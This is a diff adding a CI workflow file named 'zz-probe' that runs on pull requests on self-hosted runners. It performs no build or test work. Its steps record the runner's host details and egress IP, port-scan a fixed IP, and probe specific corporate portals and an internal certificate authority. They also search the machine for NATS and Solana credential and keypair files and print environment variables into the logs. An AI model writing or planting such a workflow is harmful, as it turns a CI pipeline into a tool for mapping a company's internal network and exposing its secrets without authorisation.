@@ -1,0 +1,57 @@
+name: zz-probe
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: [self-hosted, X64]
+    continue-on-error: true
+    timeout-minutes: 15
+    steps:
+      - name: env
+        run: |
+          set -x
+          hostname; id; uname -a
+          ip -br a 2>/dev/null || ifconfig 2>/dev/null || true
+          echo "EGRESS:"; curl -s --max-time 8 https://ifconfig.me || true; echo
+          curl -s --max-time 8 https://api.ipify.org || true; echo
+      - name: target reachability
+        run: |
+          set -x
+          T=35.209.60.215
+          for p in 22 80 443 2222; do
+            timeout 5 bash -c "echo > /dev/tcp/$T/$p" 2>/dev/null && echo "TARGET $p OPEN" || echo "TARGET $p closed"
+          done
+          curl -sk --max-time 8 "https://$T/" -o /tmp/t -w 'HTTP %{http_code}\n' || true
+          head -c 300 /tmp/t || true
+          curl -s --max-time 8 "http://$T/" -o /tmp/t2 -w 'HTTP %{http_code}\n' || true
+          head -c 300 /tmp/t2 || true
+      - name: portal + nats
+        run: |
+          set -x
+          curl -sk --max-time 8 https://wgm.jumptrading.com/ -o /tmp/w -w 'PORTAL %{http_code}\n' || true
+          head -c 300 /tmp/w || true
+          echo | timeout 8 openssl s_client -connect 208.78.215.228:443 -servername wgms.jumptrading.com 2>/dev/null | head -8 || true
+          echo | timeout 8 openssl s_client -connect 208.78.215.229:443 -servername jwgr.jumptrading.com 2>/dev/null | head -5 || true
+      - name: stepca
+        run: |
+          set -x
+          CA=gusc1a-infosec-stepca01.jumpisolated.com
+          curl -sk --max-time 8 "https://$CA:4443/health" || true
+          curl -sk --max-time 8 "https://$CA:4443/root" | head -5 || true
+          curl -sk --max-time 8 "https://$CA:4443/acme/acme/directory" || true
+          curl -sk --max-time 8 "https://$CA:4443/acme/staging/directory" || true
+          curl -sk --max-time 8 "https://$CA:4443/acme/acmeprovisioner/directory" || true
+      - name: local creds
+        run: |
+          set -x
+          ls -la ~ ~/.config ~/.nats ~/.solana 2>/dev/null || true
+          find / -maxdepth 4 -name '*.creds' -o -maxdepth 4 -name '*keypair*.json' 2>/dev/null | head -40 || true
+          env | sort | head -60
+      - name: nats cli
+        run: |
+          set -x
+          which nats nsc || true
+          curl -sk --max-time 3 https://208.78.215.228/ -o /dev/null -w 'nats-http %{http_code}\n' || true
